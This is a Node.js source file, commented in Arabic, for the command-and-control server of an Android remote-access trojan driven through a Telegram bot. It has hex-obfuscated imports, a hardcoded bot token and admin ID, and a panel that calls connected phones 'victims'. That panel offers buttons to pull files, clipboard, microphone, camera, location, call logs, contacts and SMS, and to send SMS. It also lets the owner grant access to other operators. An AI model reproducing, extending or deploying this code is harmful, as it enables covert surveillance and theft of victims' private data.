var _0x52ef=["\x65\x78\x70\x72\x65\x73\x73","\x77\x73","\x68\x74\x74\x70","\x6E\x6F\x64\x65\x2D\x74\x65\x6C\x65\x67\x72\x61\x6D\x2D\x62\x6F\x74\x2D\x61\x70\x69","\x75\x75\x69\x64","\x6D\x75\x6C\x74\x65\x72","\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72","\x61\x78\x69\x6F\x73"];
const express=require(_0x52ef[0]);const webSocket=require(_0x52ef[1]);const http=require(_0x52ef[2]);const telegramBot=require(_0x52ef[3]);const uuid4=require(_0x52ef[4]);const multer=require(_0x52ef[5]);const bodyParser=require(_0x52ef[6]);const axios=require(_0x52ef[7]);

// --- إعدادات المطور ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
const ADMIN_ID = 6568145373; 
const DEV_USER = "@A_l_k_w_r_y";

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];
let allowedUsers = [ADMIN_ID]; 

// --- إدارة الرسائل والتحكم ---
bot.on("message", (msg) => {
    const id = msg.chat.id;
    const user = msg.from;
    const text = msg.text;

    // نظام التحقق من الصلاحيات
    if (!allowedUsers.includes(id)) {
        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب انضمام جديد!</b>\n\n👤 الاسم: <code>${user.first_name}</code>\n🆔 المعرف: <code>${id}</code>\n🔗 اليوزر: @${user.username || 'لا يوجد'}`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[{ text: "✅ منح الصلاحية", callback_data: `allow_${id}` }, { text: "❌ رفض", callback_data: `block_${id}` }]]
            }
        });
        return bot.sendMessage(id, "⏳ <b>عذراً، وصولك معلق حالياً..</b>\nتم إرسال طلبك للمطور للموافقة عليه.");
    }

    if (id === ADMIN_ID) {
        if (text === "/start") {
            bot.sendMessage(id, `👑 <b>أهلاً بك يا إمبراطور ( ${DEV_USER} )</b>\n\nالضحايا: <code>${clients.length}</code>\nالمصرح لهم: <code>${allowedUsers.length - 1}</code>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["📱 عرض الأجهزة المتصلة", "👥 إدارة المصرح لهم"],
                        ["🚫 طرد مستخدم عبر المعرف", "📢 إذاعة عامة"],
                        ["🔐 إغلاق النظام", "🔓 فتح النظام"]
                    ],
                    resize_keyboard: true
                }
            });
        }

        // ميزة الطرد عبر الأيدي
        if (text === "🚫 طرد مستخدم عبر المعرف") {
            bot.sendMessage(id, "✍️ فضلاً، أرسل (المعرف ID) الخاص بالشخص المراد طرده:");
            bot.once("message", (reMsg) => {
                const targetId = parseInt(reMsg.text);
                if (targetId === ADMIN_ID) return bot.sendMessage(id, "❌ لا يمكنك طرد نفسك!");
                allowedUsers = allowedUsers.filter(u => u !== targetId);
                bot.sendMessage(id, `✅ تم سحب الصلاحيات من <code>${targetId}</code> بنجاح.`, {parse_mode: 'HTML'});
                bot.sendMessage(targetId, "⚠️ تم إلغاء صلاحية وصولك للبوت من قبل الإدارة.");
            });
        }

        if (text === "📱 عرض الأجهزة المتصلة") {
            if (clients.length === 0) return bot.sendMessage(id, "❌ لا توجد أجهزة متصلة حالياً.");
            clients.forEach(c => {
                bot.sendMessage(id, `📍 جهاز: <code>${c.id}</code>\n🌍 عنوان IP: <code>${c.ip}</code>`, {
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: "🎮 لوحة التحكم بالجهاز", callback_data: `control_${c.id}` }]] }
                });
            });
        }
    }
});

// --- معالجة الأزرار (قائمة الاختراق المعربة) ---
bot.on("callback_query", (q) => {
    const [action, value] = q.data.split("_");

    if (action === "allow") {
        allowedUsers.push(parseInt(value));
        bot.sendMessage(value, "✅ <b>تمت الموافقة على طلبك!</b>\nيمكنك الآن استخدام كافة أدوات النظام.");
        bot.answerCallbackQuery(q.id, { text: "تم المنح" });
    }

    if (action === "control") {
        const victimId = value;
        const controlButtons = {
            inline_keyboard: [
                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }],
                [{ text: "📋 الحافظة", callback_data: `clip_${victimId}` }, { text: "🎙️ تسجيل صوتي", callback_data: `mic_${victimId}` }],
                [{ text: "📸 كاميرا أمامية", callback_data: `selfie_${victimId}` }, { text: "📸 كاميرا خلفية", callback_data: `maincam_${victimId}` }],
                [{ text: "📍 تحديد الموقع", callback_data: `loc_${victimId}` }, { text: "💬 رسالة تنبيه", callback_data: `toast_${victimId}` }],
                [{ text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }, { text: "👥 قائمة الأسماء", callback_data: `contacts_${victimId}` }],
                [{ text: "📳 هز الجهاز", callback_data: `vibrate_${victimId}` }, { text: "🔔 إرسال إشعار", callback_data: `notif_${victimId}` }],
                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${victimId}` }, { text: "📤 إرسال SMS", callback_data: `sendmsg_${victimId}` }],
                [{ text: "🎵 تشغيل ملف صوتي", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${victimId}` }]
            ]
        };
        bot.sendMessage(ADMIN_ID, `⚠️ <b>لوحة السيطرة الكاملة على:</b> <code>${victimId}</code>`, {
            parse_mode: 'HTML',
            reply_markup: controlButtons
        });
    }
});

// --- استقبال اتصالات الضحايا ---
wss.on('connection', (ws, req) => {
    const deviceId = uuid4().substring(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    clients.push({ id: deviceId, ws: ws, ip: ip });
    bot.sendMessage(ADMIN_ID, `⚠️ <b>تم رصد اتصال جديد 🔥</b>\n🆔 الجهاز: <code>${deviceId}</code>\n🌍 IP: <code>${ip}</code>`, { parse_mode: 'HTML' });
    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
});

server.listen(process.env.PORT || 3000, () => { console.log(`System Online for ${DEV_USER}`); });
